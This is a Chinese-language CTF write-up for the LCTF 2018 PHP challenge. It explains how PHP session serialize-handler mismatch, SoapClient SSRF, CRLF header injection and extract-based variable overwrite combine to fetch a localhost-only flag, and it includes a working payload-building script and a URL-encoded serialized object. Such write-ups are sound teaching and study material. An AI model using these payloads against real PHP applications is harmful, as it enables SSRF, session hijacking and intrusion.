@[toc]

##  前言

这个题主要综合了很多知识点，特别综合

考点：

1. session反序列化
2. 原生类SoapClient的SSRF
3. 变量覆盖
4. CRLF

##  WP

首页代码

```php
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET['f'], $_POST);
session_start();
if (isset($_GET['name'])) {
    $_SESSION['name'] = $_GET['name'];
}
var_dump($_SESSION);
$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
call_user_func($b, $a);
?>
```

看到`session_start()`，想到了session反序列化

看到wp后，知道有个flag.php可以直接访问

```php
<?php
session_start(); 
echo 'only localhost can get flag!'; 
$flag = 'LCTF{*************************}'; if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){ 
    $_SESSION['flag'] = $flag; 
} 
```

看到127.0.0.1,想到了要利用SSRF，可以利用原生类SoapClient来实现SSRF

###  call_user_func函数

```
它会把第一个参数作为回调函数，其余参数当作为回调函数的参数。

假如我们第一参数传入的是数组，会把数组的第一个值当作类名，第二个值当作方法进行回调。

call_user_func 函数不止可以调用自定义函数、类，也可以调用php内置函数、内置类 如extract
```

###  php中session反序列化机制

php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。
存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。
在php.ini中存在三项配置项：

```
session.save_path=""   --设置session的存储路径
session.save_handler="" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)
```

**session.serialize_handler存在以下几种:**

```
php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值
php 键名+竖线（|）+经过serialize()函数处理过的值
php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化
```

在PHP中默认使用的是**PHP引擎**(5.5.4后改为php_serialize)，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。
当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。



补充一点：cookie中PHPSESSID会作为服务器session的文件名（sess_....）,session中存在的内容就是序列化的内容，格式就是上面几种处理器决定的，存储路径就是session.save_path来决定的。

### 构造SSRF之SoapClient类

SoapClient是php内置的类，当__call方法被触发后（调用不存在方法），它可以发送HTTP和HTTPS请求。该类的构造函数如下：

```
public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）
```

第一个参数是用来指明是否是wsdl模式。

第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则**必须设置location和uri选项**，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。



利用点就是，可以实现SSRF(127.0.0.1),一般都可以配合`CRLF`来伪造报头。

###  CRLF Injection漏洞

CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。
我们要让服务器去访问flag.php，且把flag存放在session里，那么我们就一定需要携带一个cookie去访问它。但是SoapClient这个类，好像没有指定cookie的接口，所以，我们就可以在user_agent里面，加上一个\r\n，然后再加上一个cookie，就达到了我们的目的。

###  解题步骤

首先构造反序列化

```php
<?php
$a = new SoapClient(null,
    array(
        'user_agent' => "z3eyond\r\nCookie:PHPSESSID=123456789",
        'uri' => 'z3eyond',
        'location' => 'http://127.0.0.1/flag.php'
    )
);
$b = serialize($a);
#$c = unserialize($b);
#$c->not_a_function();//调用不存在的方法，让SoapClient调用__call
echo urlencode($b);
//$a->hello();
```

得到

```
O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A7%3A%22z3eyond%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A35%3A%22z3eyond%0D%0ACookie%3APHPSESSID%3D123456789%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

**进行第一步的传值**

![img](https://img-blog.csdnimg.cn/6997cdfbd10d4a599ff72f55679b7c3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)

在这一步，

1. 通过`call_user_func`将序列化引擎从`php`改变为`php_serialize`。其中利用的是session_start,一般是利用ini.set,来修改处理器，但是POST传入的参数是数组，ini.set不能处理数组，所以使用session_start来修改。

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306162813230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)

2. 将SoapClient的反序列化储存在session中，并在前面，加一个“|”符号,此时session会以php_serialize的规则储存：a:1:{s:4:“name”;s:199:"|xxx…"}

**进行第二步的传值**

![img](https://img-blog.csdnimg.cn/594cd563b8a24f6682084425aa9eb383.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)

在这一步中，

1. call_user_func(\$\_GET[‘f’], $_POST); 将b变量，用[extract](https://www.php.net/manual/zh/function.extract.php)函数，进行覆盖，覆盖为call_user_func

2. session_start(), 此时的序列化引擎为php，此函数会按照php的方法，把我们刚才传入的session，进行反序列化。

   **这儿补充一下：之所以能利用session反序列化，就是因为序列化引擎和反序列化引擎不同。**

3. \$a=array(reset(\$_SESSION), ‘welcome_to_the_lctf2018’); 

\$_SESSION中的值与“welcome_to_the_lctf2018”和并为一个数组

4. call_user_func($b, $a); 因为$b变量已经被我们覆盖成了call_user_func，那么此时的程序，就变成了call_user_func(call_user_func,array($_session,‘welcome_to_the_lctf2018’));

5. `array($_SESSION,'welcome_to_the_LCTF2018')`作为参数，调用到第二个`call_user_func`，`call_user_func`当传入参数是数组中，第一个参数为类名，第二个是方法,`welcome_to_the_lctf2018`不是方法，所以触发了SoapClient

**进行第三步传值**

![img](https://img-blog.csdnimg.cn/1005937776804bf3a2d75bdea35d9582.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)

在这一步，触发了SoapClient，就是访问127.0.0.1/flag.php,伪造了cookie，PHPSESSID=123456789，将flag的内容存储在session中

然后在index.php中，再次用PHPSESSID=123456789,就可以直接获取session内容(有flag)，var_dump($_SESSION)，就可以读取flag。



###  总结

该题思路就是：先将`SoapClient`的序列化内容存储在`session`中，利用`call_user_func`和`extract`，将b变量的值覆盖了。在最后的`call_user_func($b, $a);`访问不可访问的方法，就可以触发SoapClient,发送http请求进行SSRF，将flag的变量存储在session中，再次通过cookie的`PHPSESSID`获取带有flag的session内容。